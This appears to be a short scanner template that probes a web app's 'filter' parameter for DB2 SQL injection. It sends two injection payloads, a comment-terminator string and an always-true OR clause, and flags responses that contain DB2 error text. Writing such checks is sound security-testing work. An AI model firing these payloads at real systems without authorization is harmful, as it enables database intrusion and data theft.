id: sqli6-db2-23
name: 'SQLi db2 probe in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - '''))--'
        - ''') OR ''a''=''a'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
